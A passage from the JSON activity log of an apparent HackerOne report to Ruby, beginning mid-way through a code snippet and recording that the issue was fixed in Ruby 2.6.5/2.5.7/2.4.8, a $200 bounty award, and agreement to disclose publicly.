FileTest.send(command, file1, file2)\n           else\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-09-11T16:20:08.750Z","updated_at":"2019-09-11T16:20:08.750Z","actor":{"username":"mame","cleared":false,"url":"/mame","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6059709,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"This issue was fixed at Ruby 2.6.5/2.5.7/2.4.8.  Thank you for the report.  I'll leave the bounty handling to IBB.","markdown_message":"\u003cp\u003eThis issue was fixed at Ruby 2.6.5/2.5.7/2.4.8.  Thank you for the report.  I\u0026#39;ll leave the bounty handling to IBB.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-16T23:08:03.536Z","updated_at":"2019-10-16T23:08:03.536Z","actor":{"username":"mame","cleared":false,"url":"/mame","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ooooooo_q","url":"/ooooooo_q"},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6059724,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-16T23:10:37.465Z","updated_at":"2019-10-16T23:10:37.465Z","actor":{"url":"/ruby","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Ruby"}},"bounty_amount":"200.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"ruby","collaborator":{"username":"ooooooo_q","url":"/ooooooo_q"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6059725,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-16T23:10:46.579Z","updated_at":"2019-10-16T23:10:46.579Z","first_to_agree":true,"actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6059755,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-16T23:15:28.330Z","updated_at":"2019-10-16T23:15:28.330Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6059756,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-16T23:15:28.422Z","updated_at":"2019-10-16T23:15:28.422Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}